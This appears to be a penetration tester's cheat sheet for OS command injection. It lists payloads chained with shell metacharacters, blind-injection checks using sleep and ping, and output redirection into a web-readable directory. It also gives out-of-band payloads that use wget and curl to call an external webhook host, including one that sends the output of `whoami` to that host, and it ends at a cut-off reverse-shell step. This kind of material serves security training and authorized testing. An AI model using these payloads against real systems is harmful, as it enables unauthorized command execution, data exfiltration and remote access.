...
*Using `1` as the regular command/expression for the below.*
1. Try: `1; whoami`
2. If blocked or fails, try: 
	- `1 & whoami &` 
	- `1 && whoami` 
	- `1 | whoami`
	- `1||whoami||`
	- `` 1`whoami` `` 
	- `1$(whoami)`
3. If no output is shown, try: `1; sleep 5` or `1 && ping -c 5 127.0.0.1`
	- *Add all the methods from step 2 to step 3*
4. If nothing, URL encode payloads and go through all payloads again
5. If nothing, finding what characters are causing the error specifically and bypass those (such as a space, ;, |, &, etc...)
6. Also try bypassing commands

> *Note: Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using `"` or `'`) before using suitable shell metacharacters to inject a new command.*
...
#### Redirect Output
If you can view files from a location (such as /images), and there is blind injection vulnerability, redirect the output to a new file in the location that you can read:
```
ProductID=1||whoami>/var/www/images/output.txt||
```
- Then go the page, capture request in burp, and change the request for the image to `output.txt`
#### Out-of-band Interaction
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Confirm this is vulnerable by modifying the susceptible parameter (`ProductID`), changing it to:
    `ProductID=1||wget http://www.webhook.site/your-site||`
	- *URL encode if this doesn't work*
	- Try `wget` and `curl`

3. Once confirmed, you can  send commands to your site:
	``ProductID=1||curl http://`whoami`.webhook.site/your-id||``
	- *URL encode if this doesn't work*
	- Try `wget` and `curl`

4. Or you can send a reverse shell to a listener on your device:
